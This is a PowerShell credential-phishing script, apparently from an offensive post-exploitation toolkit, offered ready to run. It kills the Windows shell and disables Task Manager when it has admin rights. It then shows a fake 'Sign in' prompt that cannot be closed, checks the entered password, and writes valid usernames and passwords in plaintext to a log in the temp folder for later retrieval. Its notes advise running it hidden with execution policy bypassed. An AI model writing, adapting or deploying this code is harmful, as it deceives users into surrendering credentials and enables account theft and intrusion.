<#
.SYNOPSIS
  Standalone Powershell script that will promp the current user for a valid credential.

  Author: r00t-3xp10it - (Based on @Dviros CredsLeaker)
  Required Dependencies: Target Account Password Set
  Optional Dependencies: None
  PS Script Dev Version: v1.0

.DESCRIPTION
   This script will display a Windows Security Credentials box that will ask the user for his credentials.
   The box cannot be closed (only by killing the process) and it keeps checking the credentials against the DC.
   If its valid, it will leak it via one remote logfile stored on target $env:tmp folder to be retrieved later.
   This Script will limmit the number of times that asks for credentials to less than 30 attempts before aborting.
   This script will Block remote-host Task Manager during current tasks IF executed with Administrator privileges. 

.NOTES
   Its recomended to exec NewPhish.ps1 in a hidden terminal windows.
   This Script will limmit the number of times that asks for credentials to less than 30 attempts before aborting.
   This script will Block remote-host Task Manager during current tasks IF executed with Administrator privileges.

.EXAMPLE
   PS C:\> powershell -exec bypass -w 1 -noninteractive -nologo -file "NewPhish.ps1"

.INPUTS
   None. You cannot pipe objects to NewPhish.ps1

.OUTPUTS
   Saves CredsPhish.log to the selected directory. 'tmp' is the default.

.LINK
    https://github.com/Dviros/CredsLeaker
    https://github.com/r00t-3xp10it/meterpeter
    http://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask
#>


$timestamp = $null
taskkill /f /im explorer.exe
$ComputerName = $env:COMPUTERNAME
$CurrentDomain_Name = $env:USERDOMAIN
$SYSTEM_SHELL = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
If($SYSTEM_SHELL){## Block Remote-Host 'Task Manager' to prevent users from aborting this PS script execution. (Admin privileges Required)
    Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 1 -Force
}


## Prerequisites
Add-Type -AssemblyName System.Runtime.WindowsRuntime
Add-Type -AssemblyName System.DirectoryServices.AccountManagement
$asTaskGeneric = ([System.WindowsRuntimeSystemExtensions].GetMethods() | ? { $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1' })[0]
[Windows.Security.Credentials.UI.CredentialPicker,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerResults,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.AuthenticationProtocol,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]
[Windows.Security.Credentials.UI.CredentialPickerOptions,Windows.Security.Credentials.UI,ContentType=WindowsRuntime]


## For our While loop
[int]$counter = 0
$status = $true

## There are 6 different authentication protocols supported.
## https://docs.microsoft.com/en-us/uwp/api/windows.security.credentials.ui.authenticationprotocol
$options = [Windows.Security.Credentials.UI.CredentialPickerOptions]::new()
$options.AuthenticationProtocol = 0
$options.Caption = "Sign in"
$options.Message = "Enter your credentials"
$options.TargetName = "1"


## CredentialPicker is using Async so we will need to use Await
function Await($WinRtTask, $ResultType) {
    $asTask = $asTaskGeneric.MakeGenericMethod($ResultType)
    $netTask = $asTask.Invoke($null, @($WinRtTask))
    $netTask.Wait(-1) | Out-Null
    $netTask.Result
}


function Credentials(){
    while ($status){

        ## Defining the Limmit number of times to ask target for creds before aborting.
        # Change the next value to increase/decrease the number of times the msgbox prompts.
        If($counter -eq 30){
            If($SYSTEM_SHELL){## This Line Un-Blocks Remote-Host 'Task Manager' after reached 30 credentials fail attempts. (Admin privileges Required)
                Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 0 -Force
            }
          Start-Process -FilePath $env:windir\explorer.exe
          $status = $false
          exit
        }
        
        ## Where the magic happens
        $creds = Await ([Windows.Security.Credentials.UI.CredentialPicker]::PickAsync($options)) ([Windows.Security.Credentials.UI.CredentialPickerResults])
        if (-not($creds.CredentialPassword) -or $creds.CredentialPassword -eq $null){
            $counter++
            Credentials
        }
        if (-not($creds.CredentialUserName) -or $creds.CredentialUserName -eq $null){
            $counter++
            Credentials
        }
        else {
            $Username = $creds.CredentialUserName;
            $Password = $creds.CredentialPassword;
            if ((Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain -eq $false -and ((Get-WmiObject -Class Win32_ComputerSystem).Workgroup -eq "WORKGROUP") -or (Get-WmiObject -Class Win32_ComputerSystem).Workgroup -ne $null){
                $domain = "WORKGROUP"
                $workgroup_creds = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$ComputerName)
                if ($workgroup_creds.ValidateCredentials($UserName, $Password) -eq $true){
                    ## Leak Creds to remote logfile ($env:tmp)
                    $timestamp = Get-Date;echo "" > $env:tmp\CredsPhish.log
                    echo "   Captured Credentials (logon)" >> $env:tmp\CredsPhish.log
                    echo "   ----------------------------" >> $env:tmp\CredsPhish.log
                    echo "   TimeStamp : $timestamp" >> $env:tmp\CredsPhish.log
                    echo "   username  : $Username" >> $env:tmp\CredsPhish.log
                    echo "   password  : $Password" >> $env:tmp\CredsPhish.log
                        If($SYSTEM_SHELL){## This Line Un-Blocks Remote-Host 'task manager' after an valid credential is found. (Admin privileges Required)
                            Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 0 -Force
                        }
                    Start-Process -FilePath $env:windir\explorer.exe
                    $status = $false
                    exit
                    }
                else {
                    $counter++
                    Credentials
                    }                
                }
        }
    }
}
Credentials
